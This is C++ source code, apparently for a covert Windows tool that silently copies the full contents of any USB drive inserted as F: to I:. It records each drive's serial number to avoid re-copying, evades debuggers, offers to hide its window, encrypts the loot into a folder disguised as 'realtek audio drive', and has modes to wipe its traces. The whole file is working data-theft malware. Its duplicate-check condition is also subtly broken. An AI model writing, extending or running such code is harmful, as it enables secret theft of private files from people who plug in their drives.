#include <iostream>
#include <serialnumber.h>
#include <string>
#include <dir_exist.h>
#include <copy_dir.h> 
#include <file_exist.h>
#include <DeleteFile.h>
#include <vector>
#include <fileio.h>
#include <uninstall.h>
#include <size.h>
#include <compressor.h>
#include <ctime>
#include <direct.h>
#include <algorithm>

using namespace std;


int main()
{
	
	if (IsDebuggerPresent()) {
		MessageBoxA(NULL, "不要乱搞!!!", "", MB_OK);
		return 0;
	}
	//防止被调试或反汇编
	
	//输入应该以哪种模式启动
	char command[50];
	cin >> command;
	string comparison(command);//transform to string

	//initializing config information
	char buffer[MAX_PATH];
	_getcwd(buffer, MAX_PATH);
	string exepath =  buffer;          //识别当前exe所在路径


	string udisk_dir[4] = { "F:\\","G:\\","H:\\","I:\\" };
	string transpath = exepath + "\\temp\\";
	string zippath = exepath + "\\realtek audio drive\\";
	string recordfile = exepath + "\\serialnum.txt";
	
	//对模式进行判断
	if (comparison == "debug") {        //测试模式
		cout << "debug start" << endl << endl;
		//测试exe路径是否能够正常识别，及路径是否正确设置
		cout << exepath << transpath << zippath << recordfile;
		
		//1.测试磁盘序列号模块
		cout << "check serial number model" << endl;
		char str[20] = "c:\\";
		DWORD hdnum = serialnum(str);
		cout << "C:\\ serial number is "<< hdnum << endl << endl;
		
		//2.测试复制模块
		cout << "check copy_dir model" << endl;
		string src = exepath + "\\copytest";
		string des = exepath +"\\copytest2";
		copyDir(src, des);
		cout << "Success?\t" << ((exist_test(exepath + "\\copytest2\\1.txt") )? "Yes" : "No") << endl << endl;
		
		//3.测试U盘存在识别模块
		cout << "check dir_exist model" << endl;
		string ZVolume = "Z:\\";
		BOOL ZVolumeExist = CheckFolderExist(ZVolume);
		cout << "Whether Directory Z:\\ exists:\t" << ( ZVolumeExist ? "True" : "False" ) << endl << endl;

		//4.测试文件存在模块
		cout << "check existence judge model" << endl;
		bool existtest = exist_test(exepath + "\\1.vbs");
		cout << (existtest ? "Success" : "Error") << endl << endl;

		//5. 测试文件删除模块
		cout << "check file delete model" << endl;
		DeleteAllFile( (exepath + (string)"\\copytest2\\copytest" ).c_str());
		cout << (CheckFolderExist(exepath + "\\copytest2\\copytest") ? "Error" : "Success") << endl << endl;
		
		//6.测试vector写入输出模块
		cout << "check vector i/o model" << endl;
		vector<vector<int>> ves;
		vector<int> a{ 1, 2, 3 };
		vector<int> b{ 2, 4, 5, 6 };
		ves.push_back(a);
		ves.push_back(b);
		string pathtest(exepath + "\\hello.txt");
		vectorTxt(ves,pathtest);
		vector<vector<int>> vesread = txtVector(pathtest);
		vectorPrint(vesread);
		cout << endl << endl;
		
		//7.测试磁盘剩余空间获取模块
		cout << "check volume size model" << endl;
		char volumesymbol1[20] = "c:\\";
		int volumeleftsize_temp = volumesize(volumesymbol1);
		cout << "C:\\ used space:" << volumeleftsize_temp /1024 /1024 << "GiB" << endl << endl;
		
		//8.测试系统时间
		cout << "check system time model" << endl;
		time_t current1 = time(&current1);
		char buff1[26];
		ctime_s(buff1, sizeof buff1, &current1);
		string buff1_str = buff1;
		cout << "system time is \t" << buff1 << endl;
		/*
		//去除string中不适合用于文件名的非法字符
		string test3 = zippath + "GC " + buff1;
		test3.erase(remove(test3.begin(), test3.end(), '\n'), test3.end());
		test3.erase(remove(test3.begin(), test3.end(), '\t'), test3.end());
		test3.erase(remove(test3.begin(), test3.end(), '\0'), test3.end());
		cout << test3;
		cout << "123" << endl;
		*/
		system("pause");
	}
	else if (comparison == "normal") {        //工作模式
		cout << "press space to hide the command window (silent mode)\n" << endl;
		cout << "five seconds to decide" << endl;
		int i;
		while (TRUE) {                      //进入检测与复制的死循环
			for (i = 0; i <= 3; i++) {      //进入依次对三个U盘盘符进行复制的循环
				//检测磁盘是否占用过大
				if (volumesize((char*)"E:\\") >= 150 * 1024 * 1024) {
					cout << "E:\\" << "left space is too low" << endl;
					cout << "copy process is being hung" << endl;
					Sleep(60000);
					break;
				}

				bool flagtocopy = true; //是否进行复制的判断标识，True则复制,False则不复制
				cout << "开始识别盘符" << udisk_dir[i] << endl;

				//检测U盘盘符是否存在
				if (!(exist_test(udisk_dir[i]))) {
					flagtocopy = false;
				}

				//对带有特定文件exit.dat的U盘进行豁免
				if (exist_test(udisk_dir[i] + "exit.dat")) {
					flagtocopy = false;
					Sleep(20000);
				}
				//如果该U盘不需要复制那么跳过此次循环
				if (!flagtocopy) {
					cout << udisk_dir[i] << "不存在，是无效盘符,不会被复制" << endl;
					continue;
				}

				vector<vector<int>> comparisons_num_size = txtVector(recordfile);   //从记录文件读取以前复制过的U盘的序列号和大小至vector中
				cout << udisk_dir[i] << "存在，开始查重" << endl;
				int udiskserial = serialnum((char*)(udisk_dir[i]).c_str());         //获取U盘序列号
				int udisksize = volumesize((char*)(udisk_dir[i]).c_str());          //获取U盘大小
				cout << "UdiskSerial:\t" << udiskserial << endl;
				cout << "Udiskspace used:\t" << udisksize << endl;

				//查重模块
				vector<vector<int>>::iterator it;
				bool flag_snum_comparison = false;
				int comparison_size = 0;
				for (it = comparisons_num_size.begin(); it != comparisons_num_size.end(); ++it) {
					if ((*it)[0] == udiskserial) {
						flag_snum_comparison = true;
						comparison_size = (*it)[1];
					}
				}
				if (flag_snum_comparison && (((udisksize - comparison_size) >= -10) || (udisksize - comparison_size) <= 10))
				{
					flagtocopy = false;
				}
				//如果文件夹已经存在，由于复制模块支持比对增量复制，可以继续复制
				if (CheckFolderExist(transpath + to_string(udiskserial))) {
					flagtocopy = true;
				}

				//复制模块
				if (flagtocopy) {
					//复制U盘文件
					string fileNameSerial = to_string(udiskserial);
					copyDir(udisk_dir[i], (transpath + fileNameSerial));
					cout << "查重完成，数据库中未找到该U盘" << udisk_dir[i] << "会被复制" << endl;
					cout << "文件会存在于" << transpath << endl;
					
					//将vector写入记录文件中
					vector<int> tempvec{ udiskserial,udisksize };
					comparisons_num_size.push_back(tempvec);
					vectorTxt(comparisons_num_size, recordfile);
				}
				else
				{
					cout << "查重完成，数据库中已存在该U盘" << udisk_dir[i] << "不会被复制" << endl;
				}
			}
			Sleep(20000);
		}
	}
	else if (comparison == "clear") {         //灰烬模式
		cout << "What do you want to clear?\n" << "1.All\n2.Records\n3.Files\n";
		int input2;
		cin >> input2;
		switch (input2) {
		case 1:
			DeleteAllFile((char*)transpath.c_str());
			DeleteAllFile((char*)zippath.c_str());
			DeleteAFile((char*)recordfile.c_str());
			break;
		case 2:
			DeleteAFile((char*)recordfile.c_str());
			break;
		case 3:
			DeleteAllFile((char*)zippath.c_str());
			DeleteAFile((char*)recordfile.c_str());
			break;
		default:
			cout << "illegal input.\nProgram will exit after 5 seconds.";
			Sleep(5000);
			exit(0);
			break;
		}
	}
	else if (comparison == "garbagecollection") {
		if (volumesize((char*)"E:\\") >= 120 * 1024 * 1024) {
			DeleteAllFile((char*)transpath.c_str());
			exit(0);
		}
		time_t current = time(&current);
		char buff[26];
		ctime_s(buff, sizeof buff, &current);
		string buff_str = buff;
		string filename2 = zippath +"GC " + buff_str + ".7z";
		filename2.erase(remove(filename2.begin(), filename2.end(), '\n'), filename2.end());
		filename2.erase(remove(filename2.begin(), filename2.end(), '\t'), filename2.end());
		filename2.erase(remove(filename2.begin(), filename2.end(), '\0'), filename2.end());
		compress(exepath, transpath, filename2);
		string remakedir = "mkdir " + transpath;
		system((char*)remakedir.c_str());
	}
	else if (comparison == "uninstall") {
		uninstalling();
		exit(0);
	}
	else if (comparison == "compress") {
		//调用7zip进行加密和压缩
		compressAllDir(exepath, transpath,zippath);
	}
	else {
		cout << "illegal input.\nProgram will exit after 5 seconds.";
		Sleep(5000);
		exit(0);
	}
	return 0;
}